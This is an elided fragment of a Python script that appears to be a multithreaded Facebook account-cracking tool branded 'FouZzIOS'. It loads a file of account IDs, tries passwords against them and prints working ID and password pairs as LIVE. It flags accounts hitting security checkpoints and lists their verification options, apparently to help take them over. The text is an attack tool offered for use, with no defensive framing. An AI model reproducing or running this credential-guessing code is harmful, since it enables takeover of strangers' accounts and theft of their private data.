...
def menu():
	...
	try:
		print('')
		print(f'    \x1b[38;5;6m File \x1b[38;5;4mCrack \x1b[38;5;2mVip')
		print('')
		print('')
		jum = input(f'   \x1b[38;5;25mFile\x1b[38;5;29m Location = ')
		print('')
	...
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	print(' \033[1;92mLIVE : %s '%(ok))
	print('\033[1;93m BAD : %s '%(cp))
	print('')
	exit()
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r\033[1;37m[  \x1b[38;5;51mFouZzIOS\033[1;37m = \x1b[38;5;29m{loop}\x1b[38;5;89m | \x1b[38;5;88m{len(id)} \033[1;90m|\033[1;92m LIVE:{ok} \033[1;90m|\033[1;93m BAD:{cp}  \033[1;37m]"),
	sys.stdout.flush()
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;37m[ \033[1;93mBAD\033[1;37m ]\033[1;93m {idf}\033[1;37m |\033[1;93m {pw}')
				...
				print(f'\r\033[1;37m[\033[1;92m LIVE\033[1;37m ]\033[1;92m {idf}\033[1;37m |\033[1;92m {pw}')
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[FouZzIOS]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s[FouZzIOS%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s[FouZzIOS]%s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s[FouZzIOS]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[FouZzIOS]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# '
